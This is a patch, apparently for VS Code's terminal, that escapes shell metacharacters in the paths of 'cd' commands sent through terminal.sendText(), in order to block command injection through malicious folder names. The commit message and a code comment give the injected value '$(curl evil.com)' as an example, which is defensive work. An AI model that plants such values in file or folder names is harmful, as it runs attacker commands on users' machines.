@@ -1,0 +1,64 @@
+Sanitize folder paths in terminal sendText to prevent command injection
+
+Folder names containing shell metacharacters (e.g., $(curl evil.com))
+can trigger command injection when extensions send commands like
+"cd <path> && python file.py" via terminal.sendText(). This patch
+sanitizes path segments in cd commands by escaping shell-dangerous
+characters before the text is written to the terminal process.
+
+Index: b/src/vs/platform/terminal/common/terminalEnvironment.ts
+===================================================================
+--- a/src/vs/platform/terminal/common/terminalEnvironment.ts
++++ b/src/vs/platform/terminal/common/terminalEnvironment.ts
+@@ -126,3 +126,29 @@ export function sanitizeCwd(cwd: string)
+ export function shouldUseEnvironmentVariableCollection(slc: IShellLaunchConfig): boolean {
+ 	return !slc.strictEnv;
+ }
++
++/**
++ * Sanitize shell-dangerous characters in path segments of terminal commands.
++ * This targets command injection via malicious folder/file names containing
++ * shell metacharacters like $(), backticks, etc. that get interpolated when
++ * extensions send raw commands via terminal.sendText().
++ *
++ * The function identifies path-like segments following 'cd' commands and
++ * escapes shell metacharacters to prevent command substitution.
++ */
++export function sanitizeCdPathsInCommand(text: string): string {
++	// Match 'cd' followed by a path, terminated by ; && || & or end of string
++	// This handles patterns like: cd /path/to/$(evil) && python file.py
++	return text.replace(
++		/\bcd\s+((?:[^\s;|&]|\\ )+)/g,
++		(_match: string, path: string) => {
++			// If the path is already properly quoted (single or double quotes), leave it alone
++			if (/^'.*'$/.test(path) || /^".*"$/.test(path)) {
++				return `cd ${path}`;
++			}
++			// Escape shell metacharacters that enable command injection
++			const sanitized = path.replace(/([\$`!#&|;(){}<>])/g, '\\$1');
++			return `cd ${sanitized}`;
++		}
++	);
++}
+Index: b/src/vs/workbench/contrib/terminal/browser/terminalInstance.ts
+===================================================================
+--- a/src/vs/workbench/contrib/terminal/browser/terminalInstance.ts
++++ b/src/vs/workbench/contrib/terminal/browser/terminalInstance.ts
+@@ -48,6 +48,7 @@ import { IEnvironmentVariableCollection,
+ import { deserializeEnvironmentVariableCollections } from '../../../../platform/terminal/common/environmentVariableShared.js';
+ import { GeneralShellType, IProcessDataEvent, IProcessPropertyMap, IReconnectionProperties, IShellLaunchConfig, ITerminalDimensionsOverride, ITerminalLaunchError, ITerminalLogService, PosixShellType, ProcessPropertyType, ShellIntegrationStatus, TerminalExitReason, TerminalIcon, TerminalLocation, TerminalSettingId, TerminalShellType, TitleEventSource, WindowsShellType, type ShellIntegrationInjectionFailureReason } from '../../../../platform/terminal/common/terminal.js';
+ import { formatMessageForTerminal } from '../../../../platform/terminal/common/terminalStrings.js';
++import { sanitizeCdPathsInCommand } from '../../../../platform/terminal/common/terminalEnvironment.js';
+ import { editorBackground } from '../../../../platform/theme/common/colorRegistry.js';
+ import { getIconRegistry } from '../../../../platform/theme/common/iconRegistry.js';
+ import { IColorTheme, IThemeService } from '../../../../platform/theme/common/themeService.js';
+@@ -1366,6 +1367,9 @@ export class TerminalInstance extends Di
+ 	}
+ 
+ 	async sendText(text: string, shouldExecute: boolean, bracketedPasteMode?: boolean): Promise<void> {
++		// Sanitize shell command substitution patterns in cd path arguments
++		// to prevent command injection via malicious folder names (e.g., $(curl evil.com))
++		text = sanitizeCdPathsInCommand(text);
+ 		// Apply bracketed paste sequences if the terminal has the mode enabled, this will prevent
+ 		// the text from triggering keybindings and ensure new lines are handled properly
+ 		if (bracketedPasteMode && this.xterm?.raw.modes.bracketedPasteMode) {
